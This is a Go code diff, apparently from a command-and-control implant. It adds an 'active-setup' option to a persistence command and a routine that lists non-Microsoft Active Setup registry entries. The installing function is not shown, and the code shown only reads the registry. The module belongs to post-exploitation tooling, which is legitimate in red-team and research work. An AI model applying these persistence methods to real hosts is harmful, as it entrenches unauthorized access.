@@ -66,10 +66,12 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistPrintProcessor(args)
 	case "accessibility":
 		return persistAccessibility(args)
+	case "active-setup":
+		return persistActiveSetup(args)
 	case "list":
 		return listPersistence(args)
 	default:
-		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, or list", args.Method)
+		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, active-setup, or list", args.Method)
 	}
 }
 
@@ -371,6 +373,44 @@ func listPersistence(args persistArgs) structs.CommandResult {
 	}
 	if !accessFound {
 		lines = append(lines, "  (no replaced binaries detected)")
+	}
+	lines = append(lines, "")
+
+	// Check Active Setup
+	lines = append(lines, "--- Active Setup (HKLM\\...\\Active Setup\\Installed Components) ---")
+	activeSetupBase := `SOFTWARE\Microsoft\Active Setup\Installed Components`
+	asKey, err := registry.OpenKey(registry.LOCAL_MACHINE, activeSetupBase, registry.ENUMERATE_SUB_KEYS)
+	asFound := false
+	if err == nil {
+		asNames, _ := asKey.ReadSubKeyNames(-1)
+		asKey.Close()
+		for _, name := range asNames {
+			subPath := activeSetupBase + `\` + name
+			subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subPath, registry.QUERY_VALUE)
+			if err != nil {
+				continue
+			}
+			stubPath, _, err := subKey.GetStringValue("StubPath")
+			subKey.Close()
+			if err == nil && stubPath != "" {
+				// Only show non-Microsoft entries (likely persistence)
+				if !strings.Contains(strings.ToLower(stubPath), "windows") &&
+					!strings.Contains(strings.ToLower(stubPath), "microsoft") {
+					displayName := name
+					if dKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subPath, registry.QUERY_VALUE); err == nil {
+						if dn, _, err := dKey.GetStringValue(""); err == nil && dn != "" {
+							displayName = dn
+						}
+						dKey.Close()
+					}
+					lines = append(lines, fmt.Sprintf("  %s  %s → %s", name, displayName, stubPath))
+					asFound = true
+				}
+			}
+		}
+	}
+	if !asFound {
+		lines = append(lines, "  (no non-Microsoft entries detected)")
 	}
 	lines = append(lines, "")
 
